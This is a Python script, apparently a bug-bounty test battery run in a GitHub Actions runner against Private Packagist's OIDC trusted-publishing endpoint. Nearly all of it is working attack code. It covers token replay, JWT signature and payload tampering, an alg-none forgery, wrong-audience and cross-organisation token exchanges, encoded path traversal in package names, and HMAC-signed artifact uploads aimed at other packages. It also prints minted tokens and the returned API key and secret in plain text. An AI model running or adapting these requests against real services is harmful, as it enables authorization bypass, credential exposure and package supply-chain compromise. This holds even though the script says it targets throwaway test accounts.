#!/usr/bin/env python3
# zt-battery.py v2 - in-runner validation battery for Private Packagist Trusted Publishing (OIDC).
# Controlled bug-bounty test: throwaway org pratik-sec-test, throwaway repo pkbbtmpb748/zt-tp-repo.
# Modes via env MODE: token | exchange | battery
# Env: AUDIENCE_IN (override), TARGET_ORG, TARGET_PKG
import base64, hashlib, hmac, io, json, os, secrets, sys, time, urllib.error, urllib.request, zipfile
from urllib.parse import parse_qsl, urlencode

API = "https://packagist.com"
HOST = "packagist.com"

def env(name, default=""):
    v = os.environ.get(name)
    return v if v else default

MODE = env("MODE", "exchange")
AUDIENCE = env("AUDIENCE_IN") or "private-packagist-trusted-publishing:pratik-sec-test"
TARGET_ORG = env("TARGET_ORG", "pratik-sec-test")
TARGET_PKG = env("TARGET_PKG", "zt-tp/zt-tp-test")
REQ_URL = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
REQ_TOK = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]

def out(*a):
    print(*a, flush=True)

def mint(aud):
    req = urllib.request.Request(REQ_URL + "&audience=" + urllib.request.quote(aud, safe=""),
                                 headers={"Authorization": "Bearer " + REQ_TOK})
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())["value"]

def raw(method, path, headers=None, body=None):
    req = urllib.request.Request(API + path, method=method, headers=headers or {})
    if body is not None:
        req.data = body if isinstance(body, bytes) else body.encode()
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, repr(e)

def reps(label, res, n=1200):
    st, hd, body = res
    out(f"### {label} => HTTP {st}")
    out(body[:n])
    out()
    return res

def exchange(bearer, org=None, pkg=None):
    p = pkg if pkg is not None else TARGET_PKG
    return raw("POST", f"/api/oidc/token-exchange/{org or TARGET_ORG}/{p}", {"Authorization": "Bearer " + bearer})

def penc(b):
    if isinstance(b, str):
        b = b.encode()
    out_ = []
    for byte in b:
        if (48 <= byte <= 57) or (65 <= byte <= 90) or (97 <= byte <= 122) or byte in b"-_.~":
            out_.append(chr(byte))
        else:
            out_.append("%%%02X" % byte)
    return "".join(out_)

def sign(method, path, key, secret, query="", body=b""):
    ts = str(int(time.time()))
    cnonce = secrets.token_hex(20)
    params = {"key": key, "timestamp": ts, "cnonce": cnonce, "version": "2", "query": query}
    if body:
        params["body"] = body
    items = sorted(params.items(), key=lambda kv: kv[0])
    canonical = "&".join(f"{penc(k)}={penc(v)}" for k, v in items)
    sts = f"{method}\n{HOST}\n{path}\n{canonical}"
    sig = base64.b64encode(hmac.new(secret.encode(), sts.encode(), hashlib.sha256).digest()).decode()
    return f"PACKAGIST-HMAC-SHA256 Key={key}, Timestamp={ts}, Cnonce={cnonce}, Version=2, Signature={sig}"

def signed(method, path, key, secret, query="", body=b"", label=""):
    h = {"Authorization": sign(method, path, key, secret, query=query, body=body)}
    if body:
        h["Content-Type"] = "application/json"
    return reps(label, raw(method, path + (("?" + query) if query else ""), h, body or None))

def make_zip(name, version):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("composer.json", json.dumps({"name": name, "version": version,
                  "description": "zt trusted-publishing test artifact", "type": "library"}))
    return buf.getvalue()

def upload(path, key, secret, content, filename, label):
    h = {"Authorization": sign("POST", path, key, secret, body=content),
         "Content-Type": "application/zip", "X-FILENAME": filename}
    return reps(label, raw("POST", path, h, content))

def main():
    out(f"CONFIG mode={MODE} aud={AUDIENCE} target={TARGET_ORG}/{TARGET_PKG}")
    if MODE == "token":
        t = mint(AUDIENCE)
        out("TOKEN_RAW=" + t)
        out("TOKEN_B64=" + base64.b64encode(t.encode()).decode())
        return
    if MODE == "exchange":
        t = mint(AUDIENCE)
        out("TOKEN_B64=" + base64.b64encode(t.encode()).decode())
        reps("EXCHANGE", exchange(t))
        return

    # ---------------- battery v2 ----------------
    A = mint(AUDIENCE)
    out("TOKEN_A_B64=" + base64.b64encode(A.encode()).decode())
    r = reps("T1-LEGIT exchange token-A -> " + TARGET_PKG, exchange(A))
    key = secret = None
    if r[0] == 200:
        try:
            j = json.loads(r[2]); key = j.get("key"); secret = j.get("secret")
            out("T1_KEY=" + str(key)); out("T1_SECRET=" + str(secret))
        except Exception as e:
            out("T1 parse err: " + repr(e))
    reps("T2-REPLAY token-A again", exchange(A))

    B = mint(AUDIENCE)
    H, P, S = B.split(".")
    Sx = S[:-1] + ("A" if S[-1] != "A" else "B")
    NH = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    reps("T3a-TAMPER sig-flip", exchange(f"{H}.{P}.{Sx}"))
    reps("T3b-TAMPER alg-none", exchange(f"{NH}.{P}."))
    mid = len(P) // 2
    Pbad = P[:mid] + ("A" if P[mid] != "A" else "B") + P[mid + 1:]
    reps("T3c-TAMPER payload-flip", exchange(f"{H}.{Pbad}.{S}"))
    reps("T3d-TAMPER truncated", exchange(B[:80]))
    reps("T3e-TAMPER empty-bearer", exchange(""))
    reps("T3f-TAMPER garbage-bearer", exchange("garbage.token.here"))
    reps("T4-TAMPER-VERIFY token-B legit", exchange(B))

    C = mint(AUDIENCE)
    reps("X1-EXISTS-NO-CONFIG psr%2Flog", exchange(C, pkg="psr%2Flog"))
    D = mint(AUDIENCE)
    reps("X2-CONFIG-NO-PACKAGE zt-tp%2Fzt-tp-new", exchange(D, pkg="zt-tp%2Fzt-tp-new"))
    E = mint("private-packagist-trusted-publishing:victim-sec-test")
    reps("X4-WRONG-AUD victim-aud -> own package", exchange(E))
    F = mint("zt-garbage-aud")
    reps("X5-WRONG-AUD garbage-aud -> own package", exchange(F))
    G = mint(AUDIENCE)
    reps("X6-CROSS-ORG victim-sec-test/victim-sec-test%2Fzt-metabill-v1",
         exchange(G, org="victim-sec-test", pkg="victim-sec-test%2Fzt-metabill-v1"))
    Hh = mint(AUDIENCE)
    reps("X7-UPPERCASE-PKG ZT-TP%2FZT-TP-TEST", exchange(Hh, pkg="ZT-TP%2FZT-TP-TEST"))
    I = mint(AUDIENCE)
    reps("X9-ENCODED-DOTS psr%2Flog%2E%2E%2Fzt-tp%2Fzt-tp-test",
         exchange(I, pkg="psr%2Flog%2E%2E%2Fzt-tp%2Fzt-tp-test"))

    if key and secret:
        z1 = make_zip("zt-tp/zt-tp-test", "1.0.1")
        z2 = make_zip("zt-tp/zt-tp-new", "1.0.0")
        upload("/api/packages/zt-tp%2Fzt-tp-test/artifacts/", key, secret, z1, "zt-tp-test-1.0.1.zip",
               "P1-ZIP-UPLOAD own package (custom type -> expect 400)")
        upload("/api/packages/psr%2Flog/artifacts/", key, secret, z1, "zt-tp-test-1.0.1.zip",
               "P2-ZIP-UPLOAD cross-package psr%2Flog (expect 404)")
        st, hd, body = upload("/api/packages/artifacts/", key, secret, z2, "zt-tp-new-1.0.0.zip",
                              "P3-ZIP-UPLOAD unbound")
        aid = None
        try:
            j = json.loads(body); aid = j.get("id") if isinstance(j, dict) else None
        except Exception:
            pass
        if aid:
            signed("POST", "/api/packages/", key, secret,
                   body=json.dumps({"repoType": "artifact", "artifactIds": [aid]}), label="P4-CREATE artifact pkg from upload")
        signed("GET", "/api/packages/zt-tp%2Fzt-tp-test/", key, secret, label="P5-GET own package")
        signed("GET", "/api/packages/", key, secret, label="P6-GET package list (scope check)")
    out("BATTERY-DONE")

if __name__ == "__main__":
    main()
